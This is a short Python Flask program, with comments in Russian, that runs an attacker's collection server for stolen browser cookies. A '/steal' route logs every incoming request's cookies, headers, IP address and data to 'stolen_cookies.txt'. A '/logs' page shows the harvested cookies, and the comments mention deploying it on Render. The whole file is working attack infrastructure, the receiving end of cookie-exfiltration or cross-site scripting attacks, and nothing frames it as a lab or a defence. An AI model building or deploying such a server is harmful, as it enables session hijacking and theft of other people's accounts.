from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)

# Файл для хранения полученных кук
COOKIE_FILE = "stolen_cookies.txt"

@app.route('/', methods=['GET', 'POST'])
@app.route('/steal', methods=['GET', 'POST'])
def steal_cookie():
    """Принимает GET и POST запросы, сохраняет все данные"""
    
    # Собираем информацию о запросе
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Получаем данные разными способами
    if request.method == 'POST':
        # Пытаемся получить JSON
        if request.is_json:
            data = request.get_json()
        # Иначе получаем form-данные
        elif request.form:
            data = request.form.to_dict()
        # Иначе сырые данные
        else:
            data = request.get_data(as_text=True)
    else:
        # Для GET-запросов берем параметры
        data = request.args.to_dict()
    
    # Получаем cookies из заголовков
    cookies = request.cookies.to_dict()
    headers = dict(request.headers)
    
    # Формируем запись для сохранения
    record = {
        'timestamp': timestamp,
        'method': request.method,
        'path': request.path,
        'ip': request.remote_addr,
        'headers': headers,
        'cookies': cookies,
        'data': data
    }
    
    # Сохраняем в файл
    with open(COOKIE_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(record, ensure_ascii=False) + '\n')
    
    # Также выводим в консоль для логов Render
    print(f"[{timestamp}] Получены данные: {json.dumps(record, ensure_ascii=False)}")
    
    return jsonify({"status": "ok", "message": "Data received"})

@app.route('/logs', methods=['GET'])
def show_logs():
    """Просмотр последних 100 записей"""
    if not os.path.exists(COOKIE_FILE):
        return "Пока нет данных"
    
    with open(COOKIE_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()[-100:]  # последние 100 записей
    
    result = "<h1>Последние 100 записей</h1><pre>"
    for line in lines:
        try:
            data = json.loads(line)
            result += f"Время: {data['timestamp']}\n"
            result += f"IP: {data['ip']}\n"
            result += f"Куки: {json.dumps(data['cookies'], ensure_ascii=False, indent=2)}\n"
            result += "-" * 50 + "\n"
        except:
            result += line + "\n"
    result += "</pre>"
    return result

if __name__ == '__main__':
    # Убеждаемся, что используем порт из окружения Render
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
